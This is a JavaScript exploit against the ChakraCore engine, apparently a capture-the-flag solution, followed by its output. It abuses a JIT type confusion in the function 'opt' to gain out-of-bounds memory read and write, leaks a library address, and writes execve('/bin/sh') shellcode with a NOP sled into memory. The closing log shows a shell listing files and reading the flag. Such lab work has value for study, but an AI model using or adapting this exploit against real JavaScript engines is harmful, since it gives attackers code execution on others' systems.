var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000;
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hex(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `${x.toString(16)}`
}

let obj = {};
obj.a = 0;
obj.b = 0x1111;
obj.c = 0x2222;
obj.d = 0x3333;
obj.e = 0x4444;
obj.f = 0x5555;
obj.g = 0x6666;
obj.h = 0x7777;
obj.i = 0x8888;
target = new ArrayBuffer(0x200);

function opt(o, proto, value) {
    o.b = 3.3;

    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
    for (let i = 0; i < 20000; i++) {
        let o = {a: 0x1234, b: 0x1337};
        let o1 = {a: 0x1234, b: 0x1337, c: 0x1337, d: 0x1337};
	opt(o, o1, {});
    }
     
    var hax = new ArrayBuffer(0x28);
    let o = {a: 0x7777, b: 0x4141 };
    opt(o, o, obj);
    o.c = target;
    //obj.a = 0x400;
    //obj.b = 0x400;
    //obj.d = 0x400;
    //obj.e = 0x402;
    //obj.f = 0x403;
    obj.h = {};
    obj.i = 0x4000000;
    view = new Float64Array(target);

    dynamic_object_finalize = f2i(view[0]);
    //console.log("vtable " + hex(vtable) + " oldbuf " + hex(oldbuf));
    //view[2] = i2f(0xdeadbeef);
    console.log(hex(dynamic_object_finalize));
    console.log(hex(f2i(view[0x2433])));
    base = dynamic_object_finalize + 0xcba4b0;
    view[0x1614] = i2f(0x90909090);

    view2 = new Uint16Array(target);
        view2[0x1614*4 + 2] = 0x9090;
        view2[0x1614*4 + 3] = 0x9090;
	view2[0x1615*4 + 0] = 0x686a
view2[0x1615*4 + 1] = 0xb848
view2[0x1615*4 + 2] = 0x622f
view2[0x1615*4 + 3] = 0x6e69
view2[0x1615*4 + 4] = 0x2f2f
view2[0x1615*4 + 5] = 0x732f
view2[0x1615*4 + 6] = 0x4850
view2[0x1615*4 + 7] = 0xe789
view2[0x1615*4 + 8] = 0x7268
view2[0x1615*4 + 9] = 0x169
view2[0x1615*4 + 10] = 0x8101
view2[0x1615*4 + 11] = 0x2434
view2[0x1615*4 + 12] = 0x101
view2[0x1615*4 + 13] = 0x101
view2[0x1615*4 + 14] = 0xf631
view2[0x1615*4 + 15] = 0x6a56
view2[0x1615*4 + 16] = 0x5e08
view2[0x1615*4 + 17] = 0x148
view2[0x1615*4 + 18] = 0x56e6
view2[0x1615*4 + 19] = 0x8948
view2[0x1615*4 + 20] = 0x31e6
view2[0x1615*4 + 21] = 0x6ad2
view2[0x1615*4 + 22] = 0x583b
view2[0x1615*4 + 23] = 0x50f
   
    for (i = 10; i < 10000; ++i) {
       view[0x1614 + i] = i2f(base);
    }
    console.log("end");
}


main();
.
Enter JS Code:

JS Output:
7fdbe6150b50
0
ls
bin
ch
dev
flag
lib
lib64
libChakraCore.so
tmp
cat flag
TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
